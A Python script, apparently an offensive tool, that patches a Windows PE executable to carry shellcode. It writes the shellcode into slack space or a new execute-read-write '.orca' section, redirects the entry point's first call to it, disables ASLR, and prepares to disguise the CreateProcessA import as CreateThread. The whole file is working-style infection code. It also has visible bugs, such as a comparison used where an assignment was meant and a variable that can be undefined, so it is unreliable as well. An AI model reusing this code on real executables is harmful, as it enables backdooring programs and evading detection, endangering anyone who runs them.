from capstone import CS_ARCH_X86
from capstone import CS_MODE_32
from capstone import Cs


from ctypes import Structure, c_char, c_uint32, c_uint16
from typing import List
import struct

import utils
from utils import Shellcode
import pyx86asm
from pefile import SectionStructure

target_api = "CreateProcessA"
disguised_api = "CreateThread"
target_file = "./bin/HelloWorld.exe"
shellcode_bin = b""
param_offset = 0x3E6
pe_tool = utils.PETool(fname=target_file)
#target_file_bin:bytearray = pe_tool.change_import_api(dst=target_api, src=disguised_api)

shellcode:utils.Shellcode = utils.Shellcode(fname="./bin/iat_fooler.bin")
shellcode.set_disguised_api(api=disguised_api)

# First insert shellcode in exist section if possible

for section in pe_tool.pe.sections:
    actual_allocate_vmem_size = pe_tool.get_actual_allocated_vmem_size(section_hdr=section)
    available_size = actual_allocate_vmem_size - section.SizeOfRawData
    shellcode_address_va = 0

    if available_size > shellcode.shellcode_len:
        # use current section
        if section.IMAGE_SCN_MEM_EXECUTE == False:
            section.IMAGE_SCN_MEM_EXECUTE == True
        
        section_offset = section.PointerToRawData
        section_bin_origin = pe_tool.pe.__data__[section_offset : section_offset + section.SizeOfRawData]

        section_bin_rewrite = section_bin_origin + shellcode.shellcode
        write_offset, number_of_bytes_written = pe_tool.write_bytes_at_offset(pe_tool.size_of_current_raw, bytes(section_bin_rewrite))

        # Manifulate section header
        section.PointerToRawData=write_offset
        shellcode_address_va = section.VirtualAddress + section.SizeOfRawData # <-- the shellcode address in iamge!!
        section.SizeOfRawData = section.SizeOfRawData + number_of_bytes_written
    else:
        '''
        typedef struct _IMAGE_SECTION_HEADER {
            BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
            union {
            DWORD PhysicalAddress;
            DWORD VirtualSize;
            } Misc;
            DWORD VirtualAddress;
            DWORD SizeOfRawData;
            DWORD PointerToRawData;
            DWORD PointerToRelocations;
            DWORD PointerToLinenumbers;
            WORD  NumberOfRelocations;
            WORD  NumberOfLinenumbers;
            DWORD Characteristics;
        } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
        '''
        last_section_hdr = pe_tool.get_last_section_header()
        actual_allocated_size = pe_tool.get_actual_allocated_vmem_size(section_hdr=last_section_hdr)

        # get safe append offset with file alignment granularity
        if pe_tool.size_of_current_raw % pe_tool.file_alignment == 0:
            f_align = (int(pe_tool.size_of_current_raw / pe_tool.file_alignment)) * pe_tool.file_alignment

        else:
            f_align = (int(pe_tool.size_of_current_raw / pe_tool.file_alignment)+1) * pe_tool.file_alignment
        
        # Append new section
        pe_tool.write_bytes_at_offset(f_align, bytes(shellcode_bin))

        class SectionHeader(Structure):
            _fields_=[
                ("name", c_char*8),
                ("VirtualSize", c_uint32),
                ("VirtualAddress", c_uint32),
                ("SizeOfRawData", c_uint32),
                ("PointerToRawData", c_uint32),
                ("PointerToRelocations", c_uint32),
                ("PointerToLinenumbers", c_uint32),
                ("NumberOfRelocations", c_uint16),
                ("NumberOfLinenumbers", c_uint16),
                ("Characteristics", c_uint32)
            ]

        if shellcode.shellcode_len % pe_tool.file_alignment == 0:
            if shellcode.shellcode_len > pe_tool.file_alignment:
                new_section_size = shellcode.shellcode_len
            else:
                new_section_size = pe_tool.file_alignment
        else:
            n = (int(shellcode.shellcode_len/pe_tool.file_alignment)+1)
            new_section_raw_size = pe_tool.file_alignment * n

        if new_section_raw_size < pe_tool.section_alignment:
            new_section_virtual_size = pe_tool.section_alignment
        else:
            n = (int(shellcode.shellcode_len/pe_tool.section_alignment)+1)
            new_section_virtual_size = pe_tool.section_alignment * n
        
        new_section_hdr = SectionHeader()
        new_section_hdr.name = ".orca".encode("utf-8")
        new_section_hdr.VirtualSize = new_section_virtual_size
        new_section_hdr.PointerToRawData = f_align
        new_section_hdr.VirtualAddress = last_section_hdr.VirtualAddress + actual_allocated_size
        new_section_hdr.SizeOfRawData = new_section_raw_size
        new_section_hdr.Characteristics = 0x20000000 | 0x40000000 | 0x80000000 | 0x00000040# EXECUTE_READWRITE
        _section_bin = bytes(new_section_hdr)
        shellcode_address_va = new_section_hdr.VirtualAddress

        # get last section_hdr
        sections:List[SectionStructure] = pe_tool.pe.sections
        idx = 0
        last_section = None
        nt_headers_offset = pe_tool.pe.DOS_HEADER.e_lfanew
        optional_header_offset = nt_headers_offset+4+pe_tool.pe.FILE_HEADER.sizeof()
        section_hdr_offset = optional_header_offset + pe_tool.pe.FILE_HEADER.SizeOfOptionalHeader
        section = SectionStructure(pe_tool.pe.__IMAGE_SECTION_HEADER_format__, pe=pe_tool.pe)
        last_section_offset = 0
        for i in range(pe_tool.pe.FILE_HEADER.NumberOfSections):
            cur_section_offset = section_hdr_offset + section.sizeof() * i
            last_section_offset = cur_section_offset
        new_section_offset = last_section_offset + section.sizeof()
        
        # append new section header
        pe_tool.write_bytes_at_offset(new_section_offset, _section_bin)
        pe_tool.pe.FILE_HEADER.NumberOfSections = pe_tool.pe.FILE_HEADER.NumberOfSections + 1
        pe_tool.pe.OPTIONAL_HEADER.SizeOfImage = pe_tool.pe.OPTIONAL_HEADER.SizeOfImage + new_section_hdr.VirtualSize
'''
data_section:SectionStructure = pe_tool.get_section_header_by_name(sec_name=".data")
if data_section == None:
    raise Exception("There is no .data section in PE file")

# First Check Enough Virtual Size in Memory
actual_allocate_vmem_size = pe_tool.get_actual_allocated_vmem_size(section_hdr=data_section)
available_size = actual_allocate_vmem_size - data_section.SizeOfRawData

shellcode_address_va = 0

if available_size > shellcode.shellcode_len:
    # Use Data Section
    if data_section.IMAGE_SCN_MEM_EXECUTE == False:
        data_section.IMAGE_SCN_MEM_EXECUTE = False
    
    # Append .data section end of file
    data_section_offset = data_section.PointerToRawData
    # Copy origin .data section data
    origin_data_section_bin = pe_tool.pe.__data__[data_section_offset : data_section_offset + data_section.SizeOfRawData]
    # Append shellcode
    origin_data_section_bin = origin_data_section_bin + shellcode_bin
    write_offset, number_of_bytes_written = pe_tool.write_bytes_at_offset(pe_tool.size_of_current_raw, bytes(origin_data_section_bin))

    # Manifulate .data section header
    data_section.PointerToRawData=write_offset
    shellcode_address_va = data_section.VirtualAddress + data_section.SizeOfRawData
    data_section.SizeOfRawData = data_section.SizeOfRawData + number_of_bytes_written
'''

ep_va = pe_tool.pe.OPTIONAL_HEADER.AddressOfEntryPoint
ep_delta = ep_va - pe_tool.get_section_header_by_name(".text").VirtualAddress
ep_offset = pe_tool.get_section_header_by_name(".text").PointerToRawData + ep_delta

ep_routine = pe_tool.pe.__data__[ep_offset:]

md = Cs(CS_ARCH_X86, CS_MODE_32)
first_call_offset = 0
origin_call_addr = 0
callee_offset = 0
for op in md.disasm(ep_routine, ep_offset):
    if op.mnemonic == "call":
        # find first call address
        origin_call_addr = int(op.op_str, 16)
        callee_offset = first_call_offset + len(b'\xe8') # call
        break
    first_call_offset = first_call_offset + op.size

first_call_va = ep_va + first_call_offset

hook_offset = shellcode_address_va - first_call_va - 5
pe_tool.write_bytes_at_offset(offset=ep_offset + callee_offset, data=struct.pack("<I", hook_offset))

# Remove DynamicBase
pe_tool.pe.OPTIONAL_HEADER.DllCharacteristics = pe_tool.pe.OPTIONAL_HEADER.DllCharacteristics ^ 0x0040
pe_tool.pe.write("./bin/test.exe")